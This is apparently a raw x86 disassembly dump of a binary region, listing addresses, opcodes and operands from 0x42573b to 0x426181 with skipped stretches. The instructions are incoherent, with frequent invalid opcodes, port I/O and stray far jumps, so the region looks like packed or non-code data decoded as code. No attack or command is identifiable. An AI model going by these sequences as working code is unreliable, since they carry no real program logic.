  42573b:	dec    ecx
  42573c:	out    dx,eax
  42573d:	std    
  42573e:	and    al,0xc2
  425740:	or     DWORD PTR [edi],esp
  425742:	int    0xaf
  425744:	mov    eax,ds:0xac9e66e5
  425749:	jge    0x425762
  42574b:	push   esp
  42574c:	adc    BYTE PTR [ebx+0x2b],al
  42574f:	inc    edx
  425750:	xor    al,0x41
  425752:	jb     0x4256d4
  425754:	pop    esi
  425755:	cmp    cl,BYTE PTR [ebx+0x29c69089]
  42575b:	dec    esp
  42575c:	mov    ds:0xc58492da,al
  425761:	test   eax,0xa04025c2
  425766:	jg     0x425728
  425768:	ds xor esi,edx
  42576b:	pop    edi
  42576c:	inc    ecx
  42576d:	and    al,BYTE PTR [eax]
	...
  4257d3:	add    BYTE PTR [eax],al
  4257d5:	add    dh,dl
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0x78384f74
  4257e5:	sub    esp,DWORD PTR [edi-0x6e]
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	pop    edi
  4257ef:	jl     0x4257cf
  4257f1:	push   0xffffffb6
  4257f3:	dec    eax
  4257f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257f5:	data16 ins BYTE PTR es:[edi],dx
  4257f7:	sar    bh,1
  4257f9:	adc    BYTE PTR [edx-0x2724be0d],al
  4257ff:	mov    al,BYTE PTR [eax-0x45617345]
  425805:	push   edx
  425806:	pop    edi
  425807:	bnd jp 0x4257dc
  42580a:	sub    al,0xea
  42580c:	fdivr  DWORD PTR [ebx]
  42580e:	test   eax,0xfb2046d2
  425813:	sub    ebp,eax
  425815:	out    dx,al
  425816:	shl    DWORD PTR [esi+edx*8-0x2f],1
  42581a:	xchg   ecx,eax
  42581b:	(bad)  
  42581c:	sti    
  42581d:	pop    esp
  42581e:	(bad)  
  42581f:	in     eax,0xa5
  425821:	push   esp
  425822:	dec    ecx
  425823:	cmp    eax,0x785c943
  425828:	loopne 0x425865
  42582a:	push   edx
  42582b:	push   ebx
  42582c:	or     BYTE PTR [bx],dl
  42582f:	psllw  mm5,QWORD PTR [ecx+0x11]
  425833:	call   0x59c7:0x370687cb
  42583a:	dec    edx
  42583b:	in     al,dx
  42583c:	loope  0x42582d
  42583e:	jno    0x425814
  425840:	leave  
  425841:	mov    bh,0x34
  425843:	jbe    0x4257fb
  425845:	jmp    0x42589d
  425847:	repz cmp bh,BYTE PTR ds:0xcf08ec7b
  42584e:	lea    esi,[ebx+0x50536845]
  425854:	mov    ecx,0x95317cd6
  425859:	cmp    ah,BYTE PTR [ebp+0x29]
  42585c:	cs jmp 0x4add:0x8b129e5e
  425864:	cs pop ebx
  425866:	cs pop edi
  425868:	mov    dl,BYTE PTR [esi+0x18]
  42586b:	and    al,0x8a
  42586d:	mov    esp,0x53bf6648
  425872:	jo     0x42581e
  425874:	dec    ebp
  425875:	xchg   ebp,eax
  425876:	dec    ebx
  425877:	sub    DWORD PTR [ebx-0xfd6a7c8],edx
  42587d:	mov    dh,0x40
  42587f:	push   ss
  425880:	xchg   ebx,eax
  425881:	adc    bl,cl
  425883:	push   esp
  425884:	adc    DWORD PTR [edx-0x1b214362],esp
  42588a:	or     al,0xe2
  42588c:	and    esi,DWORD PTR [ebp+ebx*2+0x49fa3c37]
  425893:	int3   
  425894:	loope  0x4258c3
  425896:	std    
  425897:	sbb    al,0x40
  425899:	stc    
  42589a:	jbe    0x42584d
  42589c:	or     BYTE PTR [edi],0xe8
  42589f:	cmp    BYTE PTR [esi+0x4fc4e10f],dl
  4258a5:	jmp    0xe7d674ce
  4258aa:	popa   
  4258ab:	sbb    ebp,esp
  4258ad:	std    
  4258ae:	jecxz  0x425928
  4258b0:	xchg   ecx,eax
  4258b1:	xor    DWORD PTR [edi],ebp
  4258b3:	sbb    dh,bl
  4258b5:	pop    eax
  4258b6:	sub    DWORD PTR [edi+0x73d11e2c],ebp
  4258bc:	loop   0x425922
  4258be:	sub    eax,0x210dc154
  4258c3:	mov    edi,0xd9bf094f
  4258c8:	add    al,0x16
  4258ca:	jp     0x42591c
  4258cc:	fidiv  DWORD PTR [eax+0xb]
  4258cf:	dec    ebp
  4258d0:	adc    BYTE PTR [esp+eax*2],0x8d
  4258d4:	pop    ecx
  4258d5:	(bad)  
  4258d6:	dec    ebp
  4258d7:	add    ebp,DWORD PTR [esi]
  4258d9:	cmp    al,0x9e
  4258db:	cmp    ch,BYTE PTR [edi-0x2eb86ffc]
  4258e1:	dec    esi
  4258e2:	sub    BYTE PTR [ebp-0x42],cl
  4258e5:	xor    al,0xbf
  4258e7:	test   al,0xbf
  4258e9:	adc    DWORD PTR [ebp-0x7],ecx
  4258ec:	push   es
  4258ed:	xlat   BYTE PTR ds:[ebx]
	...
  425956:	pop    esp
  425957:	push   edx
  425958:	nop
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	adc    cl,BYTE PTR [eax]
  425964:	push   ss
  425965:	or     al,0x67
  425967:	xchg   ebx,eax
  425968:	add    DWORD PTR [eax],eax
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	repnz mul BYTE PTR ss:[ecx+0x6d]
  425973:	push   cs
  425974:	(bad)  
  425975:	lock inc ecx
  425977:	inc    edi
  425978:	dec    edi
  425979:	ss and al,0xc1
  42597d:	add    DWORD PTR [esi+0x4c7352be],esi
  425983:	mov    ?,WORD PTR [edx-0x37413f91]
  425989:	mov    al,ds:0x9c7ec7d5
  42598e:	lds    edi,FWORD PTR [edx+ebp*4]
  425991:	je     0x425a0a
  425993:	mov    ah,bh
  425995:	jno    0x425939
  425997:	dec    edi
  425998:	pop    ecx
  425999:	pop    esi
  42599a:	jmp    0xcb841c81
  42599f:	dec    esi
  4259a0:	xchg   ebx,eax
  4259a1:	cmp    eax,0x51cc46cf
  4259a6:	cmp    BYTE PTR [ecx+ecx*8-0x4c],dh
  4259aa:	dec    edi
  4259ab:	enter  0x5657,0x6e
  4259af:	mov    ecx,0xd31d31f6
  4259b4:	mov    ebx,0x4e07a2fb
  4259b9:	adc    DWORD PTR [ebx-0x194b6f64],ebx
  4259bf:	push   eax
  4259c0:	push   0x5cdef8b4
  4259c5:	dec    eax
  4259c6:	int3   
  4259c7:	cwde   
  4259c8:	in     al,dx
  4259c9:	js     0x425a19
  4259cb:	jae    0x425a08
  4259cd:	(bad)  
  4259ce:	out    0x3a,eax
  4259d0:	inc    edx
  4259d1:	jmp    0x4259f0
  4259d3:	or     edx,0xe3fdefd
  4259d9:	(bad)  
  4259da:	ficom  DWORD PTR ds:0x68fd3a1
  4259e0:	iret   
  4259e1:	jmp    0x4259e0
  4259e3:	adc    BYTE PTR [edi+0x3d],dl
  4259e6:	push   ss
  4259e7:	lods   al,BYTE PTR ds:[esi]
  4259e8:	mov    ah,cl
  4259ea:	out    0xaa,al
  4259ec:	pop    edi
  4259ed:	int    0x5
  4259ef:	mov    edi,0xd5d72794
  4259f4:	mov    bl,0x6b
  4259f6:	inc    edx
  4259f7:	pop    ecx
  4259f8:	sbb    DWORD PTR [edi+0x70fa20b6],eax
  4259fe:	adc    BYTE PTR [ecx],al
  425a00:	stc    
  425a01:	ror    cl,cl
  425a03:	jecxz  0x425a66
  425a05:	cwde   
  425a06:	hlt    
  425a07:	ret    
  425a08:	fmul   DWORD PTR ds:0x1fbf77ac
  425a0e:	test   BYTE PTR [ebx],ch
  425a10:	push   edx
  425a11:	pop    esp
  425a12:	in     eax,dx
  425a13:	(bad)  
  425a15:	jno    0x425a1d
  425a17:	push   edx
  425a18:	cs popf 
  425a1a:	inc    ecx
  425a1b:	fs aaa 
  425a1d:	mov    es,WORD PTR [ebx+0x59e198b9]
  425a23:	jmp    0x4259df
  425a25:	jp     0x425a4e
  425a27:	test   DWORD PTR [esi+0x24],eax
  425a2a:	pop    esi
  425a2b:	xchg   esp,eax
  425a2c:	test   DWORD PTR [ebp-0x1ccb6658],ebx
  425a32:	mov    BYTE PTR ds:0x952a9148,ch
  425a38:	or     ecx,DWORD PTR [ebx+ebp*4-0x567c9230]
  425a3f:	xor    ecx,DWORD PTR [ecx+0x59]
  425a42:	add    DWORD PTR [edx-0x4b],esp
  425a45:	rcl    BYTE PTR [esi+0x3],0x38
  425a49:	pusha  
  425a4a:	cmp    BYTE PTR [ecx+ebx*1+0xd],ch
  425a4e:	sbb    BYTE PTR [ecx-0x64ace93d],al
  425a54:	inc    esi
  425a55:	ins    BYTE PTR es:[edi],dx
  425a56:	lods   al,BYTE PTR ds:[esi]
  425a57:	add    BYTE PTR [edx],dl
  425a59:	stc    
  425a5a:	pushf  
  425a5b:	fwait
  425a5c:	sti    
  425a5d:	fcom   DWORD PTR [esi+0x40]
  425a60:	adc    eax,0xede6dd68
  425a65:	xchg   edx,eax
  425a66:	fdiv   QWORD PTR [ecx-0x3d]
  425a6a:	xchg   edi,eax
  425a6b:	cmc    
  425a6c:	call   0x425b5a
	...
  425ad5:	add    cl,al
  425ad7:	arpl   WORD PTR [edi+eiz*2],ax
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x4fc2e893]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	ds in  al,dx
  425af0:	pusha  
  425af1:	loopne 0x425a7c
  425af3:	mov    bh,0xf5
  425af5:	jne    0x425ad6
  425af7:	push   edx
  425af8:	adc    DWORD PTR [ecx-0x2],edx
  425afb:	sar    DWORD PTR [esi],0xa8
  425afe:	aad    0x58
  425b00:	iret   
  425b01:	jo     0x425b34
  425b03:	mov    al,ds:0x4ba92b00
  425b08:	inc    eax
  425b09:	aaa    
  425b0a:	and    cl,BYTE PTR [ebx+0x27]
  425b0d:	ficom  WORD PTR [ebx]
  425b0f:	int3   
  425b10:	pop    esi
  425b11:	jb     0x425b61
  425b13:	aad    0xbc
  425b15:	xchg   edx,eax
  425b16:	iret   
  425b17:	loop   0x425ade
  425b19:	push   esp
  425b1a:	xchg   DWORD PTR [edi],ecx
  425b1c:	mov    bh,ah
  425b1e:	push   ebp
  425b1f:	mov    ch,0x51
  425b21:	das    
  425b22:	dec    edi
  425b23:	out    0x27,al
  425b25:	gs xchg edx,eax
  425b27:	ins    BYTE PTR es:[edi],dx
  425b28:	mov    bl,0x39
  425b2a:	mov    WORD PTR [ebx-0x1c3e727e],?
  425b30:	lods   eax,DWORD PTR ds:[esi]
  425b31:	fs push edx
  425b33:	jmp    0x9f55292a
  425b38:	mov    es,ebp
  425b3a:	sub    BYTE PTR [eax+0x25],dh
  425b3d:	and    eax,0x9b7cba11
  425b42:	adc    eax,0xb3d9ce53
  425b47:	sahf   
  425b48:	leave  
  425b49:	mov    esp,0xc6e839f3
  425b4e:	inc    eax
  425b4f:	repz jmp 0x7e7cee29
  425b55:	inc    edi
  425b56:	mov    ds:0xe42e9eb3,al
  425b5b:	loope  0x425b4d
  425b5d:	adc    DWORD PTR [ecx+0x72e38573],ecx
  425b63:	adc    ecx,ebp
  425b65:	mov    esp,0xfc96d083
  425b6a:	std    
  425b6b:	repnz pop ds
  425b6d:	jl     0x425b9f
  425b6f:	sahf   
  425b70:	or     al,0xb0
  425b72:	repz sub DWORD PTR [esi+0x11],ebx
  425b76:	loop   0x425b22
  425b78:	aam    0x43
  425b7a:	pushf  
  425b7b:	push   ss
  425b7c:	sbb    eax,0x54695e80
  425b81:	scas   eax,DWORD PTR es:[edi]
  425b82:	lea    ebx,[edx+0x1d7a9fa2]
  425b88:	ins    BYTE PTR es:[edi],dx
  425b89:	lock int 0xf6
  425b8c:	mov    ecx,0xfba3eaa4
  425b91:	loope  0x425c09
  425b93:	int    0x33
  425b95:	cld    
  425b96:	test   eax,0xe0c4084b
  425b9b:	or     al,0x5e
  425b9d:	shr    BYTE PTR [ebx+0x13],cl
  425ba0:	jb     0x425b87
  425ba2:	loopne 0x425c0d
  425ba4:	ds jno 0x425b9b
  425ba7:	ins    BYTE PTR es:[edi],dx
  425ba8:	or     ecx,ebp
  425baa:	sbb    eax,0x65148842
  425baf:	cmp    esp,edx
  425bb1:	pop    ecx
  425bb2:	les    edx,FWORD PTR [ebx+ebx*4-0x4cb21ffc]
  425bb9:	push   esp
  425bba:	jp     0x425b6a
  425bbc:	and    al,0xb4
  425bbe:	sub    BYTE PTR [ecx-0x23431a4c],0xb7
  425bc5:	mov    ebx,0x801b3a9e
  425bca:	pop    ss
  425bcb:	sub    esp,DWORD PTR [edx-0x94614e1]
  425bd1:	or     al,0x47
  425bd3:	mov    edx,0x97c8adfc
  425bd8:	pop    eax
  425bd9:	nop
  425bda:	push   0xe
  425bdc:	and    DWORD PTR [ebx-0x15],ebp
  425bdf:	xchg   ebp,edx
  425be1:	sbb    ch,BYTE PTR [eax+ebp*1]
  425be4:	int    0x29
  425be6:	jb     0x425b6d
  425be8:	pop    ebx
  425be9:	test   al,0x15
  425beb:	popa   
  425bec:	stos   DWORD PTR es:[edi],eax
  425bed:	pop    eax
	...
  425c56:	(bad)  
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	shl    BYTE PTR [eax+0x4f],1
  425c65:	dec    edi
  425c66:	addr16 xchg ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	aad    0x52
  425c70:	pop    esp
  425c71:	scas   al,BYTE PTR es:[edi]
  425c72:	jno    0x425cd2
  425c74:	fmul   QWORD PTR ss:[esi+ebx*8]
  425c78:	mov    al,0xb
  425c7a:	cmc    
  425c7b:	xchg   BYTE PTR [esi+0x77],cl
  425c7e:	mov    esp,0x946d3463
  425c83:	pop    esi
  425c84:	cwde   
  425c85:	sbb    eax,0x30f638cd
  425c8a:	sub    bl,cl
  425c8c:	(bad)  [ebp-0x7995a868]
  425c92:	xor    BYTE PTR [edi-0x5115f0eb],0xf
  425c99:	pop    edx
  425c9a:	mov    dl,bh
  425c9c:	xor    BYTE PTR [esi],bl
  425c9e:	sub    al,0xa0
  425ca0:	add    eax,0xe90deb40
  425ca5:	xchg   ecx,eax
  425ca6:	xchg   edx,eax
  425ca7:	fiadd  DWORD PTR [eax]
  425ca9:	pop    esp
  425caa:	mov    esp,0x8f2b2af7
  425caf:	dec    eax
  425cb0:	call   0xfd11:0xe070a58c
  425cb7:	popa   
  425cb8:	in     al,0x83
  425cba:	inc    edi
  425cbb:	mov    eax,DWORD PTR [eax+0x61]
  425cbe:	loop   0x425ca9
  425cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cc1:	or     ebp,esi
  425cc3:	stos   DWORD PTR es:[edi],eax
  425cc4:	adc    bh,BYTE PTR [eax+0x4ec1c758]
  425cca:	idiv   BYTE PTR [edi-0x3c44d8bd]
  425cd0:	sbb    al,0x52
  425cd2:	int    0x5
  425cd4:	shr    BYTE PTR ds:0x4d3a6497,1
  425cda:	mov    bh,0xee
  425cdc:	mov    cs,esp
  425cde:	and    dh,ah
  425ce0:	mov    bh,0xf3
  425ce2:	inc    esi
  425ce3:	pusha  
  425ce4:	imul   edi,DWORD PTR [ecx+0x2e],0xffffffb4
  425ce8:	pop    edi
  425ce9:	das    
  425cea:	popa   
  425ceb:	mov    bl,cl
  425ced:	aaa    
  425cee:	sub    ebp,edx
  425cf0:	mov    edi,0x78fe3033
  425cf5:	xor    al,cl
  425cf7:	nop
  425cf8:	dec    ebx
  425cf9:	xor    BYTE PTR [edi-0x6c],cl
  425cfc:	imul   eax,DWORD PTR [esp+ebx*2-0x915a9cf],0xffffffaa
  425d04:	mov    WORD PTR [ebp+0x12800e17],ss
  425d0a:	jno    0x425d44
  425d0c:	add    al,0x7e
  425d0e:	cmp    eax,0x7cd1dd1c
  425d13:	jb     0x425d73
  425d15:	adc    al,0x80
  425d17:	imul   ebp,DWORD PTR ds:0x22260bf6,0x47415a6e
  425d21:	jae    0x425cf6
  425d23:	out    0xc1,eax
  425d25:	sbb    BYTE PTR [esi+0x2c],al
  425d28:	xchg   esi,eax
  425d29:	mov    edx,DWORD PTR [esi]
  425d2b:	fidiv  WORD PTR [eax+0x46e908fa]
  425d31:	rol    DWORD PTR ds:[edx+edx*8-0x12],0x0
  425d37:	stc    
  425d38:	mov    eax,0x28cc2e87
  425d3d:	push   es
  425d3e:	je     0x425d4d
  425d40:	push   ebx
  425d41:	pop    ds
  425d42:	lds    eax,FWORD PTR [ebx+0x22]
  425d45:	cs sub esp,edx
  425d48:	retf   0xd388
  425d4b:	jp     0x425dc6
  425d4d:	or     eax,0xf1a1b061
  425d52:	ret    
  425d53:	cs stos DWORD PTR es:[edi],eax
  425d55:	jg     0x425cd7
  425d57:	cli    
  425d58:	into   
  425d59:	xchg   esi,eax
  425d5a:	cmp    BYTE PTR [ebx+0x52388c98],0xe0
  425d61:	test   al,0xe8
  425d63:	dec    esp
  425d64:	enter  0x939c,0xca
  425d68:	nop
  425d69:	retf   
  425d6a:	mov    DWORD PTR [ecx+0x5b],edx
  425d6d:	je     0x425d6f
	...
  425dd3:	add    BYTE PTR [eax],al
  425dd5:	add    bh,bh
  425dd7:	lods   al,BYTE PTR ds:[esi]
  425dd8:	fadd   QWORD PTR [edi]
  425dda:	fbstp  TBYTE PTR [edi-0x1]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x2b632d9f,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	jae    0x425dc5
  425df0:	jmp    0x425db3
  425df2:	sub    DWORD PTR [ebp+0x49],edi
  425df5:	inc    ecx
  425df6:	sbb    DWORD PTR [esi-0xd],esp
  425df9:	pop    ds
  425dfa:	jns    0x425dab
  425dfc:	ds mov ebx,0x3d30f2b8
  425e02:	imul   edi,DWORD PTR [edx-0x21],0xffffffcf
  425e06:	and    cl,BYTE PTR [esp+ebp*4]
  425e09:	xchg   ebx,eax
  425e0a:	push   es
  425e0b:	push   ss
  425e0c:	fwait
  425e0d:	and    al,BYTE PTR [edx-0x28]
  425e10:	and    DWORD PTR [ebx-0x315e9d17],esp
  425e16:	inc    ebp
  425e17:	sub    ecx,DWORD PTR [ebx]
  425e19:	pushf  
  425e1a:	ret    
  425e1b:	add    BYTE PTR [ecx],cl
  425e1d:	lods   al,BYTE PTR ds:[esi]
  425e1e:	jo     0x425e2f
  425e20:	mov    eax,ds:0x1afb374f
  425e25:	in     al,dx
  425e26:	mov    ch,0x5d
  425e28:	jbe    0x425e7f
  425e2a:	mov    ds:0x5bce07d1,eax
  425e2f:	inc    esi
  425e30:	jge    0x425e73
  425e32:	retf   0x5dc8
  425e35:	or     ebp,edi
  425e37:	cmp    al,0x39
  425e39:	jns    0x425e8d
  425e3b:	pop    ds
  425e3c:	fbld   TBYTE PTR [esi-0x1330bce0]
  425e42:	xchg   esi,eax
  425e43:	push   ebp
  425e44:	test   al,0x70
  425e46:	idiv   DWORD PTR [ebp+0x1590bb3d]
  425e4c:	cmc    
  425e4d:	stos   BYTE PTR es:[edi],al
  425e4e:	mov    al,ds:0xa2a97fce
  425e53:	mov    esi,0xb1f920b
  425e58:	and    edx,esp
  425e5a:	outs   dx,DWORD PTR ds:[esi]
  425e5b:	sub    BYTE PTR [ebx+edx*2],ah
  425e5e:	cli    
  425e5f:	add    DWORD PTR [ebx-0xa],edi
  425e62:	xchg   dx,ax
  425e64:	jo     0x425dfc
  425e66:	push   cs
  425e67:	pop    ss
  425e68:	mov    dh,0x68
  425e6a:	push   0xffffffe4
  425e6c:	gs jle 0x425e5b
  425e6f:	mov    eax,ds:0xcf13521b
  425e74:	das    
  425e75:	push   0xfffffffc
  425e77:	or     BYTE PTR [ecx-0x2],dh
  425e7a:	sub    al,cl
  425e7c:	mov    cl,0x4b
  425e7e:	rcr    eax,1
  425e80:	sbb    eax,eax
  425e82:	or     edi,DWORD PTR [edx-0x71]
  425e85:	dec    esi
  425e87:	in     eax,0x30
  425e89:	push   0x5b
  425e8b:	dec    esp
  425e8c:	inc    ebp
  425e8d:	lock cmp dl,BYTE PTR [ecx]
  425e90:	sbb    DWORD PTR [edx],edi
  425e92:	and    al,0x1e
  425e94:	and    esp,edx
  425e96:	and    dl,0x30
  425e99:	mov    ecx,0x33b9bd3
  425e9e:	pop    ss
  425e9f:	mov    ah,0x4d
  425ea1:	pusha  
  425ea2:	pop    es
  425ea3:	cmp    eax,0xaee74ce9
  425ea8:	gs sub al,0x67
  425eab:	repz dec edi
  425ead:	fmul   st(5),st
  425eaf:	jle    0x425ea0
  425eb1:	cmp    al,0x84
  425eb3:	and    ebp,esi
  425eb5:	wbinvd 
  425eb7:	mov    bl,0xfa
  425eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eba:	call   0x1720:0xae1d0421
  425ec1:	ret    
  425ec2:	or     DWORD PTR [edi+0x17],ebp
  425ec5:	and    eax,0x73c617ff
  425eca:	dec    ebp
  425ecb:	popf   
  425ecc:	hlt    
  425ecd:	not    dl
  425ecf:	cmp    ebp,ebx
  425ed1:	sahf   
  425ed2:	aaa    
  425ed3:	(bad)  
  425ed4:	pop    ebp
  425ed5:	mov    fs,WORD PTR [eax]
  425ed7:	jp     0x425e94
  425ed9:	into   
  425eda:	xchg   edx,eax
  425edb:	scas   eax,DWORD PTR es:[edi]
  425edc:	mov    dl,0x38
  425ede:	push   ebp
  425edf:	leave  
  425ee0:	push   ss
  425ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ee2:	push   ecx
  425ee3:	add    al,0x2d
  425ee5:	lods   al,BYTE PTR ds:[esi]
  425ee6:	mov    ch,0x68
  425ee8:	push   ebx
  425ee9:	mov    dh,0xfb
  425eeb:	sub    ah,ah
  425eed:	sub    eax,DWORD PTR [eax]
	...
  425f53:	add    BYTE PTR [eax],al
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	xchg   esi,eax
  425f63:	push   esi
  425f64:	push   0x57
  425f66:	addr16 xchg edi,eax
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	add    BYTE PTR [ecx],al
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	dec    esi
  425f6f:	(bad)  
  425f70:	adc    BYTE PTR [ebp+0x5bfd250f],ch
  425f76:	mov    ebx,0xfd29dc03
  425f7b:	inc    esi
  425f7c:	lahf   
  425f7d:	lahf   
  425f7e:	or     BYTE PTR [esi],bl
  425f80:	jmp    0x2185fe4f
  425f85:	(bad)  
  425f86:	and    eax,DWORD PTR [ebx]
  425f88:	popf   
  425f89:	and    al,BYTE PTR [edi+ecx*4-0x62362ca1]
  425f90:	into   
  425f91:	jo     0x425f3c
  425f93:	inc    esi
  425f94:	pop    ds
  425f95:	mov    bl,0xf5
  425f97:	push   ecx
  425f98:	pop    ss
  425f99:	aad    0xb0
  425f9b:	arpl   WORD PTR [edi],si
  425f9d:	rcl    BYTE PTR [esi-0x59],0x89
  425fa1:	retf   0xc815
  425fa4:	push   cs
  425fa5:	imul   edi,DWORD PTR [ecx],0x1537be1f
  425fab:	int    0xac
  425fad:	enter  0xc80d,0xb4
  425fb1:	adc    al,0x36
  425fb3:	cli    
  425fb4:	(bad)  
  425fb5:	mov    al,0x44
  425fb7:	shr    BYTE PTR [edx+eiz*1-0x40],1
  425fbb:	fisub  WORD PTR [eax]
  425fbd:	je     0x425fb3
  425fbf:	add    ch,BYTE PTR ds:0xbb435d2c
  425fc5:	cmc    
  425fc6:	xor    al,0xcf
  425fc8:	loopne 0x425faf
  425fca:	fs aad 0xd
  425fcd:	push   0x4c5263e9
  425fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fd3:	(bad)  
  425fd4:	dec    edx
  425fd5:	sub    BYTE PTR [edx-0x187f3d85],ah
  425fdb:	push   ebp
  425fdc:	dec    ebp
  425fdd:	dec    ebp
  425fde:	add    ch,BYTE PTR [ebp+eax*2-0x2d5bd5a3]
  425fe5:	adc    al,0x60
  425fe7:	add    al,0x81
  425fe9:	popa   
  425fea:	popa   
  425feb:	test   BYTE PTR ds:0x74c63c4,0x2e
  425ff2:	pop    ecx
  425ff3:	pushf  
  425ff4:	pushf  
  425ff5:	fcmovne st,st(5)
  425ff7:	iret   
  425ff8:	fisubr DWORD PTR [ebx]
  425ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ffb:	sbb    ebp,DWORD PTR [eax]
  425ffd:	mov    esp,ss
  425fff:	jns    0x42605a
  426001:	aas    
  426002:	je     0x426077
  426004:	lock sbb ch,dl
  426007:	test   al,0x36
  426009:	or     edx,ebp
  42600b:	push   ecx
  42600c:	loopne 0x425faa
  42600e:	sub    al,0x9d
  426010:	out    0x82,eax
  426012:	jb     0x425fcf
  426014:	sub    DWORD PTR ds:0x6de4d67e,esi
  42601a:	jb     0x425fbb
  42601c:	xchg   DWORD PTR [edx],ecx
  42601e:	xchg   edi,eax
  42601f:	xchg   edx,eax
  426020:	in     al,dx
  426021:	iret   
  426022:	mov    dh,0x7d
  426024:	mov    dh,BYTE PTR [esi]
  426026:	sbb    BYTE PTR [edx-0x54],ah
  426029:	mov    WORD PTR [ecx+0x31],gs
  42602c:	cld    
  42602d:	ins    DWORD PTR es:[edi],dx
  42602e:	pop    bp
  426030:	sar    eax,cl
  426032:	push   es
  426033:	sub    eax,0x49caf9d4
  426038:	cmp    DWORD PTR [edi],0x2f
  42603b:	or     al,0x5b
  42603d:	inc    edi
  42603e:	aam    0xc
  426040:	jne    0x4260b1
  426042:	sbb    BYTE PTR [edi],dh
  426044:	push   esi
  426045:	ss cmp cl,al
  426048:	xor    BYTE PTR [ebx+0x3e],dl
  42604b:	mov    ds:0xc37ed552,al
  426050:	pop    ecx
  426051:	pusha  
  426052:	mov    bh,0xc3
  426054:	pop    esi
  426055:	xchg   eax,esi
  426057:	push   ebp
  426058:	(bad)  
  426059:	ins    DWORD PTR es:[edi],dx
  42605a:	hlt    
  42605b:	mov    ds:0x875ec357,eax
  426060:	ins    BYTE PTR es:[edi],dx
  426061:	cli    
  426062:	xchg   ebp,eax
  426063:	mov    al,BYTE PTR [edi]
  426065:	mov    esp,0xda1f825d
  42606a:	push   ebx
  42606b:	loopne 0x425ff0
  42606d:	push   eax
	...
  4260d6:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260e3:	xchg   ebp,ecx
  4260e5:	das    
  4260e6:	addr16 cwde 
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	add    BYTE PTR [ecx],al
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	dec    ebp
  4260ef:	mov    ebp,0x57f4212a
  4260f4:	loope  0x4260ee
  4260f6:	lea    eax,[ebp+0x5fa39ff8]
  4260fc:	push   0x152a1783
  426101:	cmp    eax,0xb8d88352
  426106:	pop    ss
  426107:	fcmovu st,st(4)
  426109:	mov    eax,ds:0xea6b854a
  42610e:	repz mov ch,0xae
  426111:	mov    dh,0x34
  426113:	add    ch,0x7e
  426116:	ja     0x426195
  426118:	(bad)  [ebx]
  42611a:	push   es
  42611b:	ja     0x426199
  42611d:	pop    edx
  42611e:	ja     0x4260e2
  426120:	xor    BYTE PTR [ebp+0x7d234b25],dh
  426126:	mov    ds:0x6eb92aa3,al
  42612b:	and    BYTE PTR [esi],ch
  42612d:	push   esi
  42612e:	dec    eax
  42612f:	lds    esp,FWORD PTR [eax+0x7]
  426132:	sbb    DWORD PTR [ebx+0x52],ebp
  426135:	fdiv   st,st(3)
  426137:	fsub   QWORD PTR [ecx+0x1e]
  42613a:	call   0x805d:0xbb5e4c9b
  426141:	hlt    
  426142:	add    bl,BYTE PTR [edx-0x48cc068d]
  426148:	in     eax,0x93
  42614a:	xchg   ecx,eax
  42614b:	stos   BYTE PTR es:[edi],al
  42614c:	popf   
  42614d:	jle    0x426104
  42614f:	sub    DWORD PTR [edi],ecx
  426151:	dec    eax
  426152:	jo     0x4260f8
  426154:	pop    ss
  426155:	loop   0x4261b7
  426157:	xlat   BYTE PTR ds:[ebx]
  426158:	xchg   di,ax
  42615a:	dec    eax
  42615b:	dec    esp
  42615c:	sub    BYTE PTR [eax+0x13e3ac5c],0x5f
  426163:	inc    edi
  426164:	adc    ebx,DWORD PTR [esp+ebx*2]
  426167:	outs   dx,DWORD PTR ds:[esi]
  426168:	vdivsd xmm6,xmm4,QWORD PTR [ecx-0x42b531a5]
  426170:	clc    
  426171:	sub    ebp,ebx
  426173:	scas   eax,DWORD PTR es:[edi]
  426174:	aas    
  426175:	mov    bl,0xf
  426177:	clc    
  426178:	or     DWORD PTR [ebx-0x4a4b0946],0xffffffb1
  42617f:	fmul   QWORD PTR [ebx]
  426181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
